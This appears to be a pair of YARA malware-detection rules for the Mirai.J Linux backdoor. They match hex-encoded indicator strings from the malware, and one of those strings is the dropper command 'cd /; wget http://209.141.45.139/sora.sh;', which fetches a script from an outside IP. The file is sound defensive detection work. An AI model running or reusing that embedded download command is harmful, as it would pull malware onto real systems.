
rule Backdoor_Linux_Mirai_J_xp{
	meta:
		description = "Backdoor:Linux/Mirai.J!xp,SIGNATURE_TYPE_ELFHSTR_EXT,03 00 03 00 04 00 00 "
		
	strings :
		$a_00_0 = {6d 69 72 61 69 4d 49 52 41 49 } //1 miraiMIRAI
		$a_00_1 = {73 74 64 66 6c 6f 6f 64 } //1 stdflood
		$a_00_2 = {43 30 4e 4e 33 43 54 33 44 } //1 C0NN3CT3D
		$a_00_3 = {56 53 7a 4e 43 30 43 4a 74 69 33 6f 75 6b 75 } //1 VSzNC0CJti3ouku
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_00_2  & 1)*1+(#a_00_3  & 1)*1) >=3
 
}
rule Backdoor_Linux_Mirai_J_xp_2{
	meta:
		description = "Backdoor:Linux/Mirai.J!xp,SIGNATURE_TYPE_ELFHSTR_EXT,05 00 05 00 03 00 00 "
		
	strings :
		$a_00_0 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 54 53 55 4e 41 4d 49 } //1 /bin/busybox TSUNAMI
		$a_00_1 = {63 64 20 2f 3b 20 77 67 65 74 20 68 74 74 70 3a 2f 2f 32 30 39 2e 31 34 31 2e 34 35 2e 31 33 39 2f 73 6f 72 61 2e 73 68 3b } //1 cd /; wget http://209.141.45.139/sora.sh;
		$a_00_2 = {5c 78 34 35 5c 78 34 33 5c 78 34 38 5c 78 34 66 5c 78 34 34 5c 78 34 66 5c 78 34 65 5c 78 34 35 } //3 \x45\x43\x48\x4f\x44\x4f\x4e\x45
	condition:
		((#a_00_0  & 1)*1+(#a_00_1  & 1)*1+(#a_00_2  & 1)*3) >=5
 
}